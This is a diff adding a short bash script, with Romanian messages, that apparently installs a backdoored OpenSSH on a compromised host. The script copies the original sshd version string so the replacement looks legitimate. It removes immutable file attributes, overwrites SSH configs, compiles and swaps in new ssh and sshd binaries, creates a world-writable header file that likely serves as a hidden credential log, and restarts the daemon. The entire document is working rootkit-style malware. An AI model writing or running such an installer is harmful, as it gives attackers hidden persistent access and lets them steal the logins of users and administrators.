@@ -1,0 +1,51 @@
+#!/bin/bash
+HOME=`pwd`
+SSHV=`./sil localhost 22`
+printf "\n\n"
+printf "SSH Version Example: OpenSSH_3.6.1p2\n"
+mkdir /var/empty
+chown root:sys /var/empty
+chmod 755 /var/empty
+chown root /etc/init.d/sshd
+chgrp sys /etc/init.d/sshd
+chmod 555 /etc/init.d/sshd
+chattr -isa /usr/sbin/
+chattr -isa /usr/sbin/sshd
+chattr -isa /usr/bin/
+chattr -isa /usr/bin/ssh
+printf "\n\n"
+printf "Bag versiunea"
+sleep 2
+if [ "$SSHV" = "" ] ; then
+echo '#define SSH_VERSION    "'SSH-1.99-OpenSSH_3.9p1'"'>> version.h
+else
+echo '#define SSH_VERSION    "'$SSHV'"'>> version.h
+fi
+echo " "
+echo "Done."
+cd /etc/ssh
+rm -rf ssh_config sshd_config
+cp -f /usr/sbin/sshd /usr/sbin/sshd0
+cd $HOME
+cd fisiere/
+cp -f sshd_config /etc/ssh/sshd_config
+cp -f ssh_config /etc/ssh/ssh_config
+echo
+sleep 2
+cd $HOME
+echo "Acum lucrez sefule!...."
+echo "./configure --sysconfdir=/etc/ssh --bindir=/usr"
+./configure --sysconfdir=/etc/ssh --bindir=/usr
+echo "make"
+make
+rm -f /usr/sbin/sshd
+cp sshd /usr/sbin/sshd
+cp ssh /usr/bin/ssh
+echo > /usr/include/libssh.h
+chmod 777 /usr/include/libssh.h
+kill `cat /var/run/sshd.pid`
+kill `cat /var/run/sshd.init.pid`
+kill `cat /var/run/sshd2_22.pid`
+/usr/sbin/sshd
+/etc/init.d/sshd restart
+echo "Done."
